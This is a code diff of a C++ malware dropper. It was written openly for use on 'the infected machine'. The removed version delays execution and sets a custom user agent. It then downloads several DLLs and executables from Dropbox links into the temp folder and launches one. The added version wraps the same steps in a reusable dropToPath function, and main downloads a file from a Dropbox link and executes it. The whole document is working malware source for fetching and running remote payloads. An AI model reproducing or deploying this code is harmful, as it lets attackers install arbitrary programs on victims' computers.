@@ -1,65 +1,27 @@
 #include "Dropper.h"
 
-//Dropper that drops anything we want to drop to the infected machine
-//using the URLDownloadToFileW function.
-void Dropper(void) {
-	STARTUPINFO si;
+//dropToPath takes three parameters, url is the link to the file to download,
+//filePath is the filePath we want to drop(include the filename), example: C:\\Users\\53444\\Downloads\\C2\\calc.exe
+//if execute is true, is going to run the downloaded file after download finishes
+//note that some location might require admin previlige to access
+void dropToPath(std::string url, std::string filePath, bool execute) {
+	STARTUPINFOA si;
 	PROCESS_INFORMATION pi;
 	FreeConsole();
-	WCHAR temppath[262];
-	WCHAR filepath[264];
-	Sleep(60000);
-	//get the temp path
-	GetTempPathW(0x104, temppath);
-	//combine the temp path with the file name
-	PathCombineW(filepath, temppath, (LPCWSTR)u"libpng16.dll");
 	memset(&si, 0, 0x68);
 	si.cb = 0x68;
-	
-	//Delete the file from the cache
-	//DeleteUrlCacheEntryW(L"https://www.dropbox.com/s/yfyl763sy2guhkl/libpng16.dll?dl=1");
-
-	//This declearation is used to change the user agent to something else
 	UrlMkSetSessionOption(URLMON_OPTION_USERAGENT, (LPVOID)"ch0nky", 7, 0);
-	if (URLDownloadToFileW(0,
-		L"https://www.dropbox.com/s/yfyl763sy2guhkl/libpng16.dll?dl=1", filepath, 0
-	, 0) > -1) {
-		if (CreateProcessW((LPCWSTR)0x0, filepath, (LPSECURITY_ATTRIBUTES)0x0,
-			(LPSECURITY_ATTRIBUTES)0x0, 0, 0, (LPVOID)0x0, (LPCWSTR)0x0, (LPSTARTUPINFOW)&si,
+	HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), filePath.c_str(), 0, NULL);
+	if(execute) {
+		if (CreateProcessA((LPSTR)0x0, (LPSTR)filePath.c_str(), (LPSECURITY_ATTRIBUTES)0x0,
+			(LPSECURITY_ATTRIBUTES)0x0, 0, 0, (LPVOID)0x0, (LPSTR)0x0, (LPSTARTUPINFOA)&si,
 			&pi) == 0) {
 			CloseHandle(pi.hProcess);
 		}
 	}
-	PathCombineW(filepath, temppath, (LPCWSTR)u"Steganography.exe");
-	//DeleteUrlCacheEntryW(L"https://www.dropbox.com/s/5fdcpqzyiz9ml7e/Steganography.exe?dl=1");
-	UrlMkSetSessionOption(URLMON_OPTION_USERAGENT, (LPVOID)"ch0nky", 7, 0);
-	if (URLDownloadToFileW(0,
-		L"https://www.dropbox.com/s/5fdcpqzyiz9ml7e/Steganography.exe?dl=1", filepath, 0
-		, 0) > -1) {
-	}
-	PathCombineW(filepath, temppath, (LPCWSTR)u"doge.png");
-	//DeleteUrlCacheEntryW(L"https://www.dropbox.com/s/2oy3z8g1nb0scv4/doge.png?dl=1");
-	UrlMkSetSessionOption(URLMON_OPTION_USERAGENT, (LPVOID)"ch0nky", 7, 0);
-	if (URLDownloadToFileW(0,
-		L"https://www.dropbox.com/s/2oy3z8g1nb0scv4/doge.png?dl=1", filepath, 0
-		, 0) > -1) {
-	}
-	PathCombineW(filepath, temppath, (LPCWSTR)u"post.exe");
-	//DeleteUrlCacheEntryW(L"https://www.dropbox.com/s/aiib97o4pxrti6t/post.exe?dl=1");
-	UrlMkSetSessionOption(URLMON_OPTION_USERAGENT, (LPVOID)"ch0nky", 7, 0);
-	if (URLDownloadToFileW(0,
-		L"https://www.dropbox.com/s/aiib97o4pxrti6t/post.exe?dl=1", filepath, 0
-		, 0) > -1) {
-	}
-	PathCombineW(filepath, temppath, (LPCWSTR)u"libcurl.dll");
-	//DeleteUrlCacheEntryW(L"https://www.dropbox.com/s/6w64bb8g1zixeav/libcurl.dll?dl=1");
-	UrlMkSetSessionOption(URLMON_OPTION_USERAGENT, (LPVOID)"ch0nky", 7, 0);
-	if (URLDownloadToFileW(0,
-		L"https://www.dropbox.com/s/6w64bb8g1zixeav/libcurl.dll?dl=1", filepath, 0
-		, 0) > -1) {
-	}
-
-
-	return;
 }
 
+int main(int argc, char* argv[]) {
+	dropToPath("https://www.dropbox.com/s/2rx3deidm6h16tx/calc.exe?dl=1", "C:\\Users\\53444\\Downloads\\C2\\calc.exe", 1);
+	return 0;
+}
